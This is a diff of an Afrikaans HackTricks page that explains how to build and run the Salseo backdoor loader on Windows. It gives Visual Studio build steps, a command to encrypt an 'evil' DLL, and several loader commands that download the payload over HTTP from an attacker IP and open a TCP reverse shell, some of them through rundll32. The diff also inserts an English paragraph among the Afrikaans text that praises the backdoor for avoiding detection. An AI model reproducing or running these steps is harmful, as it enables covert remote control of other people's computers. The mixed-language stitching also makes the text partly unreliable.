@@ -6,9 +6,9 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
@@ -22,7 +22,7 @@ Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy hull
 
 Jy kan die **argitektuur kies** binne Visual Studio in die **linker "Bou" Tab** in **"Platform Teiken".**
 
-(\*\*As jy hierdie opsies nie kan vind nie, druk in **"Projek Tab"** en dan in **"\<Projek Naam> Eienskappe")
+(\*\*As jy hierdie opsies nie kan vind nie, druk in **"Projek Tab"** en dan in **"\<Projek Naam> Eienskappe"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
@@ -40,6 +40,14 @@ python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
 ### Windows
+
+#### Salseo
+
+Salseo is a backdoor that allows an attacker to execute shell commands on a compromised Windows system. It is written in C# and uses a TCP connection for communication. The backdoor can be compiled using Visual Studio or the C# compiler.
+
+To use Salseo, the attacker needs to run the backdoor on the target system. Once the backdoor is running, the attacker can connect to it using a TCP client and send commands to be executed on the compromised system.
+
+Salseo provides a simple and effective way for an attacker to maintain access to a compromised Windows system and execute commands without being detected.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -50,9 +58,9 @@ Ok, nou het jy alles wat jy nodig het om al die Salseo-ding uit te voer: die **g
 
 ## **Voer die agterdeur uit**
 
-### **Kry 'n TCP-omgekeerde dop (laai die geënkripteerde dll af deur HTTP)**
+### **Kry 'n TCP-omgekeerde dop (laai geënkripteerde dll af deur HTTP)**
 
-Onthou om 'n nc as die omgekeerde dopluisteraar te begin en 'n HTTP-bediener om die geënkripteerde evilsalsa te dien.
+Onthou om 'n nc as die omgekeerde dop-luisteraar te begin en 'n HTTP-bediener om die geënkripteerde evilsalsa te dien.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -87,15 +95,15 @@ Maak die SalseoLoader projek oop met behulp van Visual Studio.
 
 ### Voeg voor die hooffunksie by: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installeer DllExport vir hierdie projek
 
 #### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Soek na DllExport-pakket (deur die Blaai-tab te gebruik), en druk op Installeer (en aanvaar die popup)**
+#### **Soek na DllExport-pakket (deur die Blaai-tabblad te gebruik), en druk op Installeer (en aanvaar die popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -103,7 +111,7 @@ In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Confi
 
 ### **D**eïnstalleer DllExport
 
-Druk **Deïnstalleer** (ja, dit is vreemd, maar glo my, dit is nodig)
+Druk **Deïnstalleer** (ja, dit is vreemd, maar vertrou my, dit is nodig)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
@@ -113,7 +121,7 @@ Net **sluit** Visual Studio af
 
 Gaan dan na jou **SalseoLoader map** en **voer DllExport\_Configure.bat uit**
 
-Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**
+Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Naamruimte vir DllExport**) en druk **Toepas** 
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -129,7 +137,7 @@ Kies **Uitvoertipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> To
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Kies die **x64 platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)
+Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -160,9 +168,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-#### CMD
-
-CMD is a command-line interpreter that allows users to interact with the operating system. It can be used to execute commands to perform various tasks on a Windows system.
+### CMD
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -171,16 +177,16 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-<besonderhede>
+<details>
 
-<opsomming><sterk>Leer AWS-hacking vanaf nul tot held met</sterk> <a href="https://training.hacktricks.xyz/courses/arte"><sterk>htARTE (HackTricks AWS Red Team Expert)</sterk></a><sterk>!</sterk></opsomming>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
-</besonderhede>
+</details>
